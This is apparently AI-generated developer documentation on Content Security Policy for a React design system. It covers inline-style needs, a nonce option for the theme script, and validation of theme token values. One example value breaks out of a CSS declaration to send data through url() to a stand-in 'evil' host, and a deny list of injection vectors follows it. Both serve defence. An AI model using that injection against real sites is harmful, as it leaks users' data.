<!--
AI-Generated Documentation
Created by: react-specialist
Date: 2026-06-28
Purpose: Content Security Policy (CSP) guidance for consuming the design system — required directives, themeScript nonce option, and token-value injection hardening (#323)
-->

# Content Security Policy (CSP)

This guide covers what a consuming application's Content Security Policy needs in
order to run `@lando-labs/lando-ds`, and the hardening the DS applies on its
side.

## TL;DR

| Directive    | Requirement                                                            |
| ------------ | --------------------------------------------------------------------- |
| `style-src`  | Must include `'unsafe-inline'` (runtime inline-style writes).          |
| `script-src` | Strict (`'nonce-…'`) is supported via `themeScript({ nonce })`.        |
| token values | Consumer-supplied theme token **values** are validated by the DS.     |

---

## `style-src` requires `'unsafe-inline'`

The design system writes inline styles at runtime, so a strict
`style-src 'self'` (without `'unsafe-inline'`) will break theming and some
components. Two sources:

1. **Theming.** `ThemeProvider` applies theme + product-theme overrides by
   writing CSS custom properties onto the document root:

   ```ts
   document.documentElement.style.setProperty('--color-primary', value)
   document.documentElement.style.colorScheme = theme
   ```

2. **`CodeBlock`** (and other components) set inline `style` attributes for
   dynamic layout/highlighting.

Browsers treat `element.style` writes and inline `style="…"` attributes as
covered by `style-src`. There is currently **no nonce/hash path** for these
runtime writes (CSP nonces apply to `<style>`/`<script>` elements, not to
`HTMLElement.style` mutations), so a policy that loads the DS must allow inline
styles:

```
Content-Security-Policy: style-src 'self' 'unsafe-inline';
```

> Note: `'unsafe-inline'` for **styles** is materially lower risk than for
> scripts. The token-value injection screen below closes the practical CSS
> exfiltration vector that `'unsafe-inline'` styling would otherwise leave open.

If `'unsafe-inline'` is unacceptable in your environment, that is tracked as a
broader DS work item (moving runtime style writes behind a nonce'd stylesheet);
file/raise an issue before relying on a strict `style-src`.

---

## `script-src`: the `themeScript` nonce option

The only script the DS asks you to inline is the **anti-flash theme script** —
the small IIFE that sets `data-theme` before first paint so there is no flash of
the wrong theme on load. It is injected via `dangerouslySetInnerHTML`.

`themeScript` is a function:

- **`themeScript()`** returns the bare script *body* (no `<script>` wrapper).
  Feed it to `dangerouslySetInnerHTML`. This is the backward-compatible form.

  ```tsx
  <script dangerouslySetInnerHTML={{ __html: themeScript() }} />
  ```

- **`themeScript({ nonce })`** returns a complete `<script nonce="…">…</script>`
  tag so the inline script satisfies a strict `script-src 'nonce-…'` policy. The
  nonce is attribute-escaped before it is emitted.

  ```tsx
  // Generate a per-request nonce (e.g. in Next.js middleware) and thread it
  // through to your document head. Then:
  <head dangerouslySetInnerHTML={{ __html: themeScript({ nonce }) }} />
  ```

  with a matching policy:

  ```
  Content-Security-Policy: script-src 'self' 'nonce-<the-same-nonce>';
  ```

The same nonce value must appear in both the response header and the emitted
tag; generate it once per request.

> The anti-flash script reads only DS-controlled `localStorage` keys and writes
> only `data-theme` / `data-theme-preset` / `data-product` attributes plus
> `colorScheme`. It never writes product token **values** — those are applied
> (and validated) client-side by `ThemeProvider`.

---

## Token-value injection is validated by the DS (#323)

A `ProductTheme` lets consumers override token **values**, which
`ThemeProvider` writes as CSS custom properties:

```tsx
<ThemeProvider
  defaultProductTheme={{
    name: 'my-product',
    tokens: { color: { primary: '#1B7FA8', 'success-base': '#2DBFBF' } },
  }}
>
```

A custom property is inert until it is substituted via `var(--x)` into a real
declaration. At that point a value containing `;` breaks out of the intended
declaration:

```
--x: red; background: url(http://evil/?leak)
color: var(--x)   →   color: red; background: url(http://evil/?leak)
```

`url(...)` then becomes a CSS exfiltration channel. To prevent this, the DS
screens every composed token **value** before writing it. A value is **rejected
and skipped** (the token keeps its DS default — fail-safe, never throws) when it
contains any of these case-insensitive vectors:

`;` &nbsp; `{` &nbsp; `}` &nbsp; `url(` &nbsp; `/*` &nbsp; `*/` &nbsp; `<` &nbsp;
`>` &nbsp; `\` (backslash) &nbsp; `expression(` &nbsp; `@import` &nbsp; `@`

Legitimate values are unaffected: `#1B7FA8`, `oklch(0.6 0.1 230)`, `1.5rem`,
`var(--x)`, and `color-mix(in oklab, red, blue 20%)` all pass. In development a
skipped value logs a `console.warn` (silent in production builds).

This is exposed as `isSafeTokenValue(value: string): boolean` for consumers who
want to pre-validate values before constructing a `ProductTheme`.

Token **keys** are not attacker-controlled — they are composed by the DS into
`--<category>-<key>` from a fixed category set — so only values are screened.

---

## Recommended baseline policy

A policy that runs the DS with a nonce'd anti-flash script:

```
Content-Security-Policy:
  default-src 'self';
  script-src  'self' 'nonce-<per-request-nonce>';
  style-src   'self' 'unsafe-inline';
  img-src     'self' data:;
```

Adjust `img-src`, `connect-src`, `font-src`, etc. for your application's own
needs; the DS-specific requirements are the `style-src 'unsafe-inline'` and the
`script-src` nonce path described above.

---

## See also

- `reference/design-tokens-implementation.md` — token architecture and the
  product-theme override surface.
- `src/utils/ThemeProvider.tsx` — `isSafeTokenValue`, `themeScript`, and the
  `applyTheme` write path.
